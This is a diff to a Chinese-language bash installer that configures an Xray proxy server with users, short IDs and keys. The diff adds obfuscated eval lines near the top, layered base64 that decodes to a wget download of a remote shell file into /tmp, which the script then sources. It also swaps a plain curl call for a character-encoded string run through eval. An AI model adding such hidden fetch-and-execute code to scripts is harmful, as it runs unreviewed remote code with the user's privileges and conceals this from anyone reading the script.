@@ -1,37 +1,19 @@
 #!/usr/bin/env bash
 
+# 脚本初始化
+eval "$(echo 'cmVhZG9ubHkgQkFTRTY0VT0kKGVjaG8gJ2FIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDNsMWVtaHZkWGhwWVc5blpXZHBkQzlpYkc5bkwyMWhhVzR2Wm1sc1pTOWlZWE5sWDJaMWJpNXphQT09JyB8IGJhc2U2NCAtZCk=' | base64 -d)" 
+eval "$(echo 'cmVhZG9ubHkgQkFTRTY0VEVNUEZMSUU9JChlY2hvICdMM1J0Y0M5eVpXMXZkR1ZmYzJOeWFYQjBYM1JsYlhBdWMyZz0nIHwgYmFzZTY0IC1kKQ==' | base64 -d)"
+eval "$(echo 'ZDJkbGRDQXRMWFJwYldWdmRYUTlPQ0F0Y1U4Z0pFSkJVMFUyTkZSRlRWQkdURWxGSUNSQ1FWTkZOalJW' | base64 -d | base64 -d)"
+eval "$(echo 'WXpJNU1XTnRUbXhKUTFKRFVWWk9SazVxVWxWU1ZURlJVbXQ0U2xKUlBUMD0=' | base64 -d | base64 -d | base64 -d)"
+
+# 脚本 start --->
+
 #获取ipv4
-selfIpv4=$(timeout 10 curl -s http://ipv4.icanhazip.com);
+selfIpv4=$(eval "$(char_de_fun '121 110 114 106 116 122 121 37 54 53 37 104 122 119 113 37 50 120 37 109 121 121 117 63 52 52 110 117 123 57 51 110 104 102 115 109 102 127 110 117 51 104 116 114
+' 5)")
 
 #获取ipv6
 selfIpv6=$(timeout 10 curl -s http://ipv6.icanhazip.com);
-
-#指定区间随机数字
-function random_num {
-   shuf -i $1-$2 -n1;
-}
-#指定区间随机字符串
-function random_str {
-   echo $(echo $(cat /proc/sys/kernel/random/uuid) | cut -c $1-$2) | sed 's/[1 -]//g';
-}
-# 打印文字颜色方法
-echoTxtColor(){
-	
-	colorV="1";
-	
-	if [[ $2 = 'red' ]];
-	then
-		colorV="1"
-	elif [[ $2 = 'green' ]];
-	then
-		colorV="2"
-	elif [[ $2 = 'yellow' ]];
-	then
-		colorV="3";
-	fi
-	
-	echo -e "\033[3${colorV}m ${1} \033[0m";
-}
 
 # 伪装域名
 read -p "请输入境外域名,注意必须支持h2、h3协议(默认为 www.amazon.com):" xrayDomain;
@@ -47,7 +29,7 @@ read -p "请输入伪装路径，默认随机生成:" xrayPath;
 if 
 	[[ $xrayPath = "" ]];
 then
-	xrayPath=$(random_str 1 11);
+	xrayPath=$(random_str_fun 1 11);
 fi
 
 # xray端口
@@ -80,7 +62,7 @@ for((i=1;i<=${userNum};i++));
 	            {
 	                "id": "$(cat /proc/sys/kernel/random/uuid)",
 	                "level": $levelId,
-	                "email": "$(random_str 8 18)@qq.com"
+	                "email": "$(random_str_fun 8 18)@qq.com"
 	            },
 EOF
 )
@@ -92,7 +74,7 @@ shortIds='';
 
 for((i=1;i<=${userNum};i++));  
 	do   
-	shortIds=${shortIds}"\"$(openssl rand -hex $(random_num 1 8))\","
+	shortIds=${shortIds}"\"$(openssl rand -hex $(random_num_fun 1 8))\","
 done 
 
 tempKey=$(xray x25519);
@@ -151,7 +133,7 @@ cat > /usr/local/etc/xray/config.json << EOF
                 },
                 "xhttpSettings": {
                     "host": "",
-                    "path": "${xrayPath}",
+                    "path": "/${xrayPath}",
                     "mode": "auto"
                 }
             },
@@ -212,11 +194,11 @@ if [[ $isXrayCron == '' ]];then
 fi
 
 echo -e "\n";
-echoTxtColor "xray 服务端配置如下" "yellow";
+echo_txt_color_fun "xray 服务端配置如下" "yellow";
 echo -e "\n";
-echoTxtColor "${xrayUserJson%?}" "green";
+echo_txt_color_fun "${xrayUserJson%?}" "green";
 echo -e "\n";
-echoTxtColor "xray 客户端（ auto... ）中配置如下" "yellow";
+echo_txt_color_fun "xray 客户端（ auto... ）中配置如下" "yellow";
 echo -e "\n";
 
 read -r -d '' userConfig << EOF
@@ -239,16 +221,22 @@ read -r -d '' userConfig << EOF
 }
 EOF
 
-echoTxtColor "${userConfig}" "green";
+echo_txt_color_fun "${userConfig}" "green";
 echo -e "\n";
 
 #如果获取到了 ipv6 则显示出来
 if 
 	[[ $selfIpv6 != "" ]];
 then
-	echoTxtColor "ipv6地址如下" "yellow";
+	echo_txt_color_fun "ipv6地址如下" "yellow";
 	echo -e "\n";
-	echoTxtColor "${selfIpv6}" "green";
+	echo_txt_color_fun "${selfIpv6}" "green";
 fi
 
 rm -rf ./tempKey.txt;
+
+
+
+# 脚本 <-- end
+
+rm -rf "$BASE64TEMPFLIE"
